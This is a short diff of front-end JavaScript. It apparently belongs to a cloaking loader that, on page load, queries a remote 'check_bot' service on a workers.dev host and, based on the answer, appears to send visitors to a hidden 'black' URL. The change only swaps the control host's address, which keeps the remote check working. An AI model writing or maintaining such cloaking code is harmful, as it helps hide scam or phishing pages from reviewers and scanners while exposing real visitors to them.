@@ -90,7 +90,7 @@ const showBlack = (blackUrl) => {
 createLoader();
 
 window.addEventListener('DOMContentLoaded', () => {
-  fetch('https://green-salad.oyiluwiwu10.workers.dev/loader/api/check_bot')
+  fetch('https://green-salad-b336.oyiluwiwu10.workers.dev/loader/api/check_bot')
     .then(res => res.json())
     .then(res => {
       if (res?.code === 200 && !res.result && res.url) {
